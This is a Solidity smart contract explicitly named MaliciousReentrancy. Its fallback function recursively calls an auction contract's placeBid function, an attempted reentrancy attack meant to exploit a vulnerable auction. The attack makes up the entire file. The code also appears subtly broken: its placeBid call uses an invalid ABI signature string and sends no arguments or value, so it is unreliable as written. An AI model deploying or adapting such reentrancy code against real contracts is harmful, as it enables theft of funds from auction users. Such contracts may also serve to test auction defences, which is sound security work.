pragma solidity ^0.8.0;

contract MaliciousReentrancy {
    address public auctionContract;

    struct BidDTO {
        uint256 tokenId;
        address contractAddress;
        address seller;
        uint256 highestBid;
        address highestBidder;
    }

    constructor(address _auctionContract) {
        auctionContract = _auctionContract;
    }

    function triggerReentrancyAttack() external {
        // Call the fallback function of the auction contract
        (bool success, ) = auctionContract.call(
            abi.encodeWithSignature("placeBid(BidDTO)")
        );
        require(success, "Reentrancy attack failed");
    }

    receive() external payable {}

    fallback() external payable {
        // Recursive call to the auction contract
        (bool success, ) = auctionContract.call(
            abi.encodeWithSignature("placeBid(BidDTO)")
        );
        require(success, "Reentrancy attack failed");
    }
}
